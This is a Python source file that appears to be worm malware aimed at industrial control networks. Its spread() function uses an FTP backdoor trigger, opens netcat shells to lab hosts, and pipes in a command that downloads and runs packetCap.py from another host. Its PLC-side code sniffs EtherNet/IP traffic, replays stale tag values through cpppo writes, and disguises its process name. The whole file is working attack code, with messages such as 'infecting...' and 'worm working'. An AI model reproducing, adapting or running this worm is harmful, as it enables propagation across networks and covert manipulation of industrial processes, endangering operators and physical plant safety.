import socket
import subprocess
import shlex
import struct
import threading
import psutil
import time
import ftplib
from ctypes import cdll, byref, create_string_buffer

sessions = dict([])
recValues = dict([])

indexes = dict([])


def set_proc_name(newname):
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(newname)+1)
    buff.value = newname
    libc.prctl(15, byref(buff), 0, 0, 0)

def get_proc_name():
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(128)
    # 16 == PR_GET_NAME from <linux/prctl.h>
    libc.prctl(16, byref(buff), 0, 0, 0)
    return buff.value

def changeName():
    usedNames= []
    while True:
        newname=b''
        for proc in psutil.process_iter():
            processName = proc.name().encode()
            if processName != b'python' and \
                processName != b'python3'and \
                processName not in usedNames  :

                    usedNames.append(processName)
                    newname = processName
                    break

            #pid = proc.pid
            #print(processName, '::', pid)
        if newname != b'':
            set_proc_name(newname)
        else:
            usedNames =[]
        time.sleep(0.5)        

def packetMod():
    host = socket.gethostname()
    cpppo = ' python3 -m cpppo.server.enip.client -a 192.168.1.' + host[-1]+'0:44818 --timeout-ticks 150 '
    s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x003))
    while True:

        packet = s.recvfrom(65565)
        if  packet[1][2] ==4 :
       
            if len(packet[0]) > 120:
                if packet[0][66:68]==b'\x6f\x00':
                    if packet[0][96:98] == b'\x02\x00' and packet[0][98:100] == b'\x00\x00' and \
                        packet[0][100:102] == b'\x00\x00' and packet[0][102:104] == b'\xb2\x00' :
                        if packet[0][106:108] == b'\x52\x02' and packet[46:48] != b'\x5d\x9d':
                        #here we are in response, save the value
                            
                             if packet[0][116:117]== b'\x4d':
                                if  packet[0][120] != 80 and packet[0][120]!= 77 and packet[0][120] != 70:

                                    resource = packet[0][120:120+packet[0][119]].decode("ASCII")
                                    #print(recValues[resource][indexes[resource]%len(recValues)])
                                    cpppo_cmd = cpppo +resource + "=" + str(recValues[resource][indexes[resource]%len(recValues)])
                                    indexes[resource] += 1
                                    #print(cpppo_cmd)
                                
                                    cmd = shlex.split(cpppo_cmd)
                                        # print 'DEBUG enip _send cmd shlex list: ', cmd 

                                    try:
                                        client = subprocess.Popen(cmd, shell=False)
                                        client.wait()

                                    except :
                                        print ('Retrying ')


def spread():

    HOST = "192.168.1."
    FTP_USER = "user:)"
    FTP_PASS = "pass"

    start_server = "python3 -m http.server 80"
    start_server_cmd = shlex.split( start_server)
    http_server = subprocess.Popen(start_server_cmd , shell=False)
    time.sleep(5)

    processes=[]
    nc = 'nc 192.168.1.56 6200'
    nc_cmd = shlex.split( nc)
    getfile = """ python3 -c 'import requests; url = "http://192.168.1.77/packetCap.py";print(url); response = requests.get(url); f=open("/root/packetCap.py","wb");f.write(response.content)' \n"""
    run_file= 'python3 /root/packetCap.py'
    for i in range(10,61,10):
        FTP_HOST = HOST + str(i)
        nc = 'nc 192.168.1.' + str(i) + ' 6200'
        nc_cmd = shlex.split( nc)
        
        try:
            print("opening backdoor in ", FTP_HOST)
            ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS, timeout=3)
            ftp.quit()
            print("opened")

        except:
            print("do not worry")    

        finally:
            print("connecting...")
            processes.append(subprocess.Popen(nc_cmd , shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE))
            print("connected!\n infecting...")
            processes[-1].stdin.write(getfile.encode())
            processes[-1].stdin.flush()
            time.sleep(2)
            print("infected")
            processes[-1].stdin.write(run_file.encode())
            processes[-1].stdin.flush()
            print("worm working")

    http_server.terminate()
    for proc in processes:
        proc.terminate()


def packetCap():
    
    s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x003))
    while 1:

        packet = s.recvfrom(65565)
        if packet[0][:12]!= b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
            if packet[1][2] ==0 :
                #incoming packet -> request
                packet = packet[0][66:]
                if len(packet) > 4:
                    if packet[:2]==b'\x6f\x00':
                        if packet[30:32] == b'\x02\x00' and packet[32:34] == b'\x00\x00' and \
                        packet[34:36] == b'\x00\x00' and packet[36:38] == b'\xb2\x00' :
                         if packet[40:42] == b'\x52\x02' and packet[46:48] == b'\x05\x9d':
                            #here we are in request-> save session number and value name
  
                            if not(packet[4:8] in sessions) and packet[54] != 80 and packet[54]!= 77 and packet[54] != 70:
                                sessions[packet[4:8]] = packet[54:54+packet[53]].decode("ASCII")
            elif  packet[1][2] ==4 :
            #outgoing packet ->response
                packet = packet[0][66:]
                if len(packet) > 4:
                    if packet[:2]==b'\x6f\x00':
                        if packet[30:32] == b'\x02\x00' and packet[32:34] == b'\x00\x00' and \
                            packet[34:36] == b'\x00\x00' and packet[36:38] == b'\xb2\x00' :
                            if packet[40:42] == b'\xcc\x00':
                            #here we are in response, save the value
                                if packet[4:8] in sessions:
                                    val= b'%c%c%c%c' %( packet[-1],packet[-2],packet[-3],packet[-4])
                                    if not(sessions[packet[4:8]] in recValues):
                                        recValues[sessions[packet[4:8]]]=[]
                                        indexes[sessions[packet[4:8]]] = 0
                                
                                    recValues[sessions[packet[4:8]]].append(struct.unpack('!f', bytes.fromhex(val.hex()))[0])
                                    #delete from sessions
                                    del sessions[packet[4:8]]

if __name__ == '__main__':


    if socket.gethostname()[:3]!="PLC":
        sp = threading.Thread(target=spread)

        sp.start()

        sp.join()
    else:
        pc = threading.Thread(target=packetCap, name = "packetCap")
       # cn = threading.Thread(target=changeName, name = "changeName")
        pm = threading.Thread(target= packetMod, name = "packetMod")

        
        pc.start()
        #cn.start()  
        time.sleep(3)
        pm.start()

        changeName()
        pm.join()
        pc.join()
        #cn.join()